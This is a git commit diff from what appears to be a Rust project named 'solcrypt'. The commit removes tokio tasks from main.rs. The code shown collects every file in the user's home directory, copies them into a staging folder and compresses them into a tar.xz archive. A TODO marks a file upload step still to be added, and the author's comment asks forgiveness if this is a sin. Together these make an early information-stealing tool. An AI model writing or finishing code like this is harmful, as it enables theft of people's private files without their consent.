698e90b01573f328ac7bc687974dfa1e1e840e04
Xory <xorycode@shuriken.pm>
2024-07-11 06:19:13 -0700

    fix: remove unnecessary tokio tasks

--- src/main.rs
+++ src/main.rs
@@ -5,43 +5,28 @@ use solcrypt::VarSet;
 
 #[tokio::main]
 async fn main() {
-    let main_varset = VarSet::new(); // Lord forgive this, if according to your judgement it is a sin.
-    let homedirfiles = solcrypt::get_all_files(&main_varset.home);
+    let varset = VarSet::new(); // Lord forgive this, if according to your judgement it is a sin.
+    let homedirfiles = solcrypt::get_all_files(&varset.home);
     
     // Create a directory containing every file the user has in their home directory
-    match fs::create_dir(&main_varset.dirpath) {
+    match fs::create_dir(&varset.dirpath) {
         Ok(dir) => dir,
         Err(e) => eprintln!("ERROR: {:?}", e),
     };
 
     for file in homedirfiles {
-        match tokio::task::spawn(async move {
-            let task_varset = VarSet::new();
-            let og_filepath = Path::new(&file);
-            let filename = og_filepath.file_name().unwrap().to_str().unwrap();
-
-            match fs::copy(&file, format!("{0}\\{1}", task_varset.dirpath, &filename)) {
-                Ok(..) => {},
-                Err(e) => { eprintln!("ERROR: {}, from: {}, to: {}", e, &file, format!("{0}\\{1}", task_varset.dest, &filename)) },
-            }
-        }).await {
-            Ok(taskres) => taskres,
-            Err(e) => {
-                eprintln!("Task failed: {}", e);
-            }
+        let og_filepath = Path::new(&file);
+        let filename = og_filepath.file_name().unwrap().to_str().unwrap();
+        match fs::copy(&file, format!("{0}\\{1}", varset.dirpath, &filename)) {
+            Ok(..) => {},
+            Err(e) => { eprintln!("ERROR: {}, from: {}, to: {}", e, &file, format!("{0}\\{1}", varset.dest, &filename)) },
         }
     }
     dbg!("Compressing");
 
-    match tokio::task::spawn(async {
-        let task_varset = VarSet::new();
-        solcrypt::compress_directory_to_tar_xz(task_varset.dirpath.clone(), task_varset.dest.clone()).unwrap();
-    }).await {
-        Ok(taskres) => taskres,
-        Err(e) => {
-            eprintln!("Task failed: {}", e);
-        }
-    };
+    
+    solcrypt::compress_directory_to_tar_xz(varset.dirpath.clone(), varset.dest.clone()).unwrap();
+
     
     // TODO: Add file upload mechanism
 
